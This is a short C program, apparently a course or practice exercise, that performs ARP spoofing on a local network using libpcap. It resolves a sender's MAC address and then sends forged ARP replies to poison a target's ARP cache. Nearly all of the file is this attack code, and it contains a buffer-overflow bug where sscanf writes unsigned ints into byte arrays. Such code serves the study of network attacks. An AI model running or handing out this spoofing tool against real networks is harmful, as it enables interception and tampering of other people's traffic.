#include <stdio.h>
#include "send_arp.h"
#include <pcap.h>

int main(int argc, char* argv[]){
	uint32_t myip = 0;
	uint8_t mymac[6];
	uint8_t send_ip[4];
	uint8_t target_ip[4];
	uint8_t send_mac[6]={0xcc,0xb0,0xda,0xa2,0x36,0xdb};
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	
	if(argc != 4){
		printf("more argumnets");
		return -1;
	}
	sscanf(argv[2],"%u.%u.%u.%u",send_ip,send_ip + 1,send_ip + 2,send_ip + 3);
	sscanf(argv[3],"%u.%u.%u.%u",target_ip,target_ip + 1,target_ip + 2,target_ip + 3);
	
	get_myIpaddr(&myip, argv[1]);
	get_myMacaddr(mymac, argv[1]);
	
	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);

	if(handle == NULL){
		fprintf(stderr, "couldn't open device %s: %s\n",argv[1],errbuf);
		return -1;
	}
	
	arp_send_pkt_req(send_mac, send_ip, mymac,(uint8_t*)&myip, handle);
	printf("sender mac_add");
	print_len(send_mac,6);
	arp_send_pkt_spoof(target_ip, send_mac, send_ip, mymac,(uint8_t*)&myip, handle);
	printf("arp spoofing end");
	pcap_close(handle);
	return 1;
}
